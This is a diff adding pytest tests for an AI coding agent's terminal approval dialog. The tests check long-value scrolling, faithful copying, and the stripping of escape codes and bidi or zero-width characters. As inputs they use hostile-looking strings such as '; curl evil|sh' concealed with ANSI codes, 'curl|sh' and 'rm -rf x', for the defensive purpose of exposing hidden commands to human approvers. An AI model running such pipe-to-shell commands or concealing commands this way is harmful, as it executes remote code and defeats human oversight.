@@ -5,28 +5,36 @@
 from __future__ import annotations
 
 import asyncio
+from bisect import bisect_right
 from pathlib import Path
 from typing import Any, cast
 
 import pytest
+from rich.cells import chop_cells
 from textual.app import App, ComposeResult
 from textual.containers import VerticalGroup
+from textual.geometry import Offset, Region
 from textual.screen import ModalScreen
+from textual.selection import SELECT_ALL, Selection
+from textual.widget import Widget
 from textual.widgets import Button, Static
 
 from chrys.app.tui.screens.dialogs.approval import ApprovalDialog
 from chrys.app.tui.screens.dialogs.approval import body as approval_body_module
+from chrys.app.tui.screens.dialogs.approval import dialog as dialog_module
 from chrys.app.tui.screens.dialogs.approval.body import (
     ApprovalBody,
     ApprovalBodyBuilder,
     create_approval_body,
 )
 from chrys.app.tui.theme import CHRYS_ANSI_THEME
+from chrys.app.tui.util.source_text import BIDI_AND_ZERO_WIDTH_CODEPOINTS
 from chrys.app.tui.widgets import StableAutoHeightScroll
 from chrys.app.tui.widgets.loading import ChrysLoadingIndicator
 from chrys.app.tui.widgets.text_area import EnhancedTextArea
 from chrys.foundation.i18n import MessageRef
 from chrys.foundation.i18n.formatting import format_message
+from chrys.foundation.models.approval_reuse import ApprovalReuseOffer
 from chrys.foundation.tool_kinds import KIND_FILESYSTEM_WRITE, KIND_MCP, KIND_SUB_AGENT
 from chrys.service.approval.judge import JudgeVerdict
 from tests.support.paths import SRC_ROOT
@@ -219,6 +227,255 @@ async def test_bridged_filesystem_approval_uses_presentation_kind_for_detail() -
         # remote title (the same path) is suppressed as redundant.
         assert not list(dialog.query(".approval-arg-box"))
         assert not list(dialog.query("#approval-remote-title"))
+
+
+@pytest.mark.asyncio
+async def test_bridged_approval_scrolls_to_the_end_of_a_long_command() -> None:
+    """A remote agent's command past the display bound still shows whole: its
+    box scrolls to the last characters, and copying it adds no row breaks."""
+    limit = dialog_module._MAX_VALUE_DISPLAY_CHARS
+    command = "echo " + "x" * limit + ";curl|sh"
+    reason = "r" * limit + "-why"
+    dialog = ApprovalDialog(
+        caller_name="claude_code",
+        tool_name="acp:echo",
+        args={"command": command, "reason": reason, "cwd": "/tmp"},
+        presentation_kind="shell",
+    )
+
+    class TestApp(App):
+        def compose(self) -> ComposeResult:
+            yield Static("placeholder")
+
+    app = TestApp()
+    async with app.run_test() as pilot:
+        await app.push_screen(dialog)
+        await pilot.pause()
+
+        boxes = {str(box.border_title): box for box in dialog.query(".approval-arg-box")}
+        assert isinstance(boxes["cwd"], Static)
+        view = boxes["command"]
+        assert isinstance(view, dialog_module._LongValueView)
+        # The reason line is too long for the line under the header, so it
+        # gets a scrolling box of its own.
+        assert not dialog.query("#approval-detail")
+        assert isinstance(boxes["reason"], dialog_module._LongValueView)
+        assert boxes["reason"].has_class("approval-detail-box")
+
+        def shown() -> str:
+            return "".join(view.render_line(y).text.rstrip() for y in range(view.size.height))
+
+        await wait_for(lambda: view.size.height > 0 and "xxx" in shown(), description="command rows drawn")
+        assert ";curl|sh" not in shown()
+        # The rows take the box's colors, not the terminal's defaults.
+        row_colors = {(segment.style.color, segment.style.bgcolor) for segment in view.render_line(0) if segment.style}
+        assert row_colors == {(view.rich_style.color, view.rich_style.bgcolor)}
+        view.focus()
+        await pilot.press("end")
+        await wait_for(lambda: shown().endswith("x;curl|sh"), description="end of the command in view")
+
+        # A one-column scrollbar sits against the right border, a blank column
+        # between it and the rows.
+        scrollbar = view.vertical_scrollbar.region
+        assert (scrollbar.width, scrollbar.right) == (1, view.region.right - 1)
+        width = view.virtual_size.width
+        assert view.content_region.x + width + 1 == scrollbar.x
+
+        assert view.get_selection(SELECT_ALL) == (command, "\n")
+        across_rows = Selection(Offset(3, 0), Offset(10, 2))
+        assert view.get_selection(across_rows) == (command[3 : 2 * width + 10], "\n")
+
+        await pilot.press("y")
+        await wait_for(lambda: dialog.is_dismissed, description="approved from the focused command box")
+        assert dialog.user_decision_submitted
+
+
+@pytest.mark.asyncio
+async def test_values_past_the_dialog_layout_budget_scroll_in_boxes_of_their_own() -> None:
+    """Values each under the bound still add up to a slow layout: once the
+    dialog's budget is spent, a value that does not fit scrolls in a box of its
+    own, while a short one after it still fits."""
+    third = dialog_module._MAX_VALUE_DISPLAY_CHARS // 3
+    dialog = ApprovalDialog(
+        caller_name="claude_code",
+        tool_name="acp:write",
+        args={"description": "d" * third, "a": "a" * third, "b": "b" * (third + 50), "c": "short", "e": "e" * third},
+        presentation_kind="remote",
+    )
+
+    class TestApp(App):
+        def compose(self) -> ComposeResult:
+            yield Static("placeholder")
+
+    app = TestApp()
+    async with app.run_test() as pilot:
+        await app.push_screen(dialog)
+        await pilot.pause()
+
+        assert dialog.query("#approval-detail")
+        scrolling = {
+            str(box.border_title): isinstance(box, dialog_module._LongValueView)
+            for box in dialog.query(".approval-arg-box")
+        }
+        assert scrolling == {"a": False, "b": True, "c": False, "e": True}
+
+
+@pytest.mark.asyncio
+async def test_copying_a_long_value_keeps_its_tabs_and_line_breaks() -> None:
+    """A long file's box shows its tabs as spaces and every line break as one,
+    but a copy hands back the file as written: a Makefile recipe keeps its tab."""
+    limit = dialog_module._MAX_VALUE_DISPLAY_CHARS
+    recipe = "build:\r\n\tgcc -o app main.c\r\n\t@echo done\r\n"
+    content = "# generated\r\n" + "x" * limit + "\r\n" + recipe * 2 + "end\twith\ttabs\rlast"
+    dialog = ApprovalDialog(
+        caller_name="claude_code",
+        tool_name="acp:Write Makefile",
+        args={"path": "Makefile", "content": content},
+        presentation_kind=KIND_FILESYSTEM_WRITE,
+    )
+
+    class TestApp(App):
+        def compose(self) -> ComposeResult:
+            yield Static("placeholder")
+
+    app = TestApp()
+    async with app.run_test() as pilot:
+        await app.push_screen(dialog)
+        await pilot.pause()
+        view = dialog.query_one(dialog_module._LongValueView)
+        await wait_for(lambda: view.virtual_size.height > 0, description="content cut into rows")
+        shown = view._text
+        assert "\t" not in shown
+        assert "\r" not in shown
+
+        def at(index: int) -> Offset:
+            row = bisect_right(view._row_starts, index) - 1
+            return Offset(index - view._row_starts[row], row)
+
+        def copy(selection: Selection) -> str | None:
+            dialog.selections = {view: selection}
+            dialog.action_copy_text()
+            return app.clipboard
+
+        assert copy(SELECT_ALL) == content
+        # From inside the long line, across its rows, into a recipe line.
+        assert (
+            copy(Selection(at(shown.index("x") + 5), at(shown.index("@echo") + 3)))
+            == content[content.index("x") + 5 : content.index("@echo") + 3]
+        )
+        # A selection that starts or ends among a tab's spaces takes the tab.
+        assert (
+            copy(Selection(at(shown.index("gcc") - 3), at(shown.index("with") - 2)))
+            == content[content.index("\tgcc") : content.index("\twith") + 1]
+        )
+
+
+@pytest.mark.asyncio
+async def test_approval_shows_remote_text_without_its_control_characters() -> None:
+    """A remote agent's escape codes, bidi controls and zero-width characters
+    never reach the terminal, so a concealed `; curl evil|sh` shows wherever
+    the dialog puts the agent's text, and a copy of a value still hands it back
+    as given."""
+    command = "ls\x1b[8m; curl evil|sh\x1b[0m\t-la\u202e\r\nrm -rf x\u200b\u2028\U000e0041"
+    long_value = "\u2066" + "x" * dialog_module._MAX_VALUE_DISPLAY_CHARS + "\u202e"
+    dialog = ApprovalDialog(
+        caller_name="claude_code",
+        tool_name="acp:\x1b[8mfetch\x1b[0m \u202etitle",
+        args={"command": command, "description": "why\x1b[2K\u2067", "key\x1b[8m\u200f": "v", "long": long_value},
+        presentation_kind="shell",
+        verdict=JudgeVerdict(approved=False, reason="risky\x1b[8m \ufeffreason"),
+        reuse_offer=ApprovalReuseOffer("command", ("ls\x1b[8m; curl\u2066 evil",), prefix=True),
+    )
+    hidden = {chr(codepoint) for codepoint in BIDI_AND_ZERO_WIDTH_CODEPOINTS}
+
+    class TestApp(App):
+        def compose(self) -> ComposeResult:
+            yield Static("placeholder")
+
+    app = TestApp()
+    async with app.run_test(size=(100, 40)):
+        await app.push_screen(dialog)
+        await wait_for(lambda: dialog.query_one("#approval-concern").display, description="judge's concern shown")
+
+        def drawn(widget: Widget) -> str:
+            return "\n".join(strip.text for strip in widget.render_lines(widget.region.reset_offset))
+
+        boxes = {str(box.border_title): box for box in dialog.query(".approval-arg-box")}
+        assert set(boxes) == {"command", "key�[8m�", "long"}
+        assert isinstance(boxes["long"], dialog_module._LongValueView)
+        title, detail = dialog.query_one("#approval-remote-title"), dialog.query_one("#approval-detail")
+        tooltip = str(dialog.query_one("#reuse-remember").tooltip)
+        for text in (tooltip, *(drawn(widget) for widget in (title, detail, dialog.query_one("#approval-concern")))):
+            assert not [char for char in text if (ord(char) < 0x20 and char != "\n") or 0x7F <= ord(char) <= 0x9F]
+            assert not hidden & set(text)
+        for text in (drawn(box) for box in boxes.values()):
+            assert not [char for char in text if (ord(char) < 0x20 and char != "\n") or 0x7F <= ord(char) <= 0x9F]
+            assert not hidden & set(text)
+        assert not hidden & set(boxes["long"]._text)
+        assert "; curl evil|sh" in drawn(boxes["command"])
+        assert "-la�" in drawn(boxes["command"])
+        assert "rm -rf x���" in drawn(boxes["command"])
+        assert "fetch" in drawn(title)
+
+        def copy(widget: Widget, selection: Selection) -> str | None:
+            dialog.selections = {widget: selection}
+            dialog.action_copy_text()
+            return app.clipboard
+
+        command_box = boxes["command"]
+        assert copy(command_box, SELECT_ALL) == command
+        assert copy(command_box, Selection(Offset(2, 0), Offset(3, 1))) == command[2 : command.index("rm") + 3]
+        assert copy(detail, SELECT_ALL) == "why\x1b[2K\u2067"
+        assert copy(boxes["long"], SELECT_ALL) == long_value
+
+
+@pytest.mark.parametrize(
+    "value",
+    [
+        "",
+        "plain text",
+        "a\tb\t\tc",
+        "\t中文\tx",
+        "one\r\ntwo\rthree\nfour",
+        "make:\r\n\tcc -o a a.c\r\n\t\t@echo\x1b[31m ok\x7f",
+        "\r\n\r\n\t",
+        "a\rb\tc\x0c\td\x85\te",
+        "\u202eab\u200b\tc\u2066\r\n\ufeff\td\u2028\U000e0041\te",
+    ],
+)
+def test_long_value_selection_ends_map_back_to_the_value(value: str) -> None:
+    """Each index of the shown text maps to the boundary of the value a
+    selection there copies from: a start inside a tab's spaces falls before
+    the tab, an end there after it, and a CRLF is never split."""
+    shown = dialog_module._shown_text(value)
+    boundaries = [i for i in range(len(value) + 1) if not (i > 0 and value[i - 1 : i + 1] == "\r\n")]
+    shown_at = {i: len(dialog_module._shown_text(value[:i])) for i in boundaries}
+    assert shown_at[len(value)] == len(shown)
+
+    for index in range(len(shown) + 1):
+        start = max(i for i in boundaries if shown_at[i] <= index)
+        end = min(i for i in boundaries if shown_at[i] >= index)
+        assert dialog_module._value_index(value, index, end=False) == start
+        assert dialog_module._value_index(value, index, end=True) == end
+
+
+@pytest.mark.parametrize("width", [2, 3, 10, 84])
+def test_long_value_rows_cut_each_line_as_rich_does(width: int) -> None:
+    lines = [
+        "a" * 25,
+        "",
+        "中文" * 9,
+        "短",
+        "e\u0301" * 6,
+        # Long ASCII stretches beside graphemes that pair across their edges.
+        "x" * 100 + "中" + "#" * 70 + "\ufe0f\u20e3" + "y" * 70 + "👨\u200d👩\u200d👧" + "z" * 70,
+        "中\u200d" + "q" * 80,
+    ]
+    text = "\n".join(lines)
+    rows, starts = dialog_module._fold_rows(text, width)
+
+    assert rows == [piece for line in lines for piece in chop_cells(line, width) or [""]]
+    assert all(text[start : start + len(row)] == row for row, start in zip(rows, starts, strict=True))
 
 
 def test_detail_line_prefers_kind_specific_reason_over_description() -> None:
@@ -777,6 +1034,55 @@ async def test_sub_agent_approval_body_edits_prompt() -> None:
         await pilot.pause()
 
     assert results == [(True, "", {"prompt": "inspect src and tests"})]
+
+
+@pytest.mark.asyncio
+async def test_approval_bodies_show_model_text_without_its_hidden_characters(tmp_path: Path) -> None:
+    """The planned diff and the delegation prompt show escape codes, bidi
+    controls and zero-width characters as marks, and an unedited prompt still
+    goes out as given."""
+    from chrys.app.tui.widgets.diff_view.code import CodeColumn
+
+    hidden = {chr(codepoint) for codepoint in BIDI_AND_ZERO_WIDTH_CODEPOINTS}
+    text = "echo safe\x1b[8m; curl evil|sh\x1b[0m\u202e\u200b\n"
+    cases = {
+        "write_file": {"path": str(tmp_path / "run.sh"), "content": text},
+        "explore_agent": {"prompt": text},
+    }
+    results: list[tuple[bool, str, dict[str, object] | None]] = []
+
+    class TestApp(App):
+        def compose(self) -> ComposeResult:
+            yield Static("placeholder")
+
+    for tool_name, args in cases.items():
+        kind = KIND_FILESYSTEM_WRITE if tool_name == "write_file" else KIND_SUB_AGENT
+        body = await create_approval_body(tool_name, kind, args)
+        assert body is not None
+        dialog = ApprovalDialog(caller_name="Code", tool_name=tool_name, tool_kind=kind, args=args, approval_body=body)
+
+        app = TestApp()
+        async with app.run_test(size=(100, 40)) as pilot:
+            await app.push_screen(dialog, callback=results.append)
+            if tool_name == "write_file":
+                await wait_for(
+                    lambda dialog=dialog: [column for column in dialog.query(CodeColumn) if column.size.height],
+                    timeout=20,
+                    pilot=pilot,
+                    description="planned diff laid out",
+                )
+                column = dialog.query_one(CodeColumn)
+                shown = "\n".join(strip.text for strip in column.render_lines(Region(0, 0, *column.size)))
+            else:
+                await pilot.pause()
+                shown = dialog.query_one("#approval-sub-agent-prompt-input", EnhancedTextArea).text
+            assert "; curl evil|sh" in shown
+            assert not [char for char in shown if (ord(char) < 0x20 and char != "\n") or 0x7F <= ord(char) <= 0x9F]
+            assert not hidden & set(shown)
+            dialog.query_one("#approval-yes", Button).press()
+            await pilot.pause()
+
+    assert results == [(True, "", None), (True, "", None)]
 
 
 @pytest.mark.asyncio
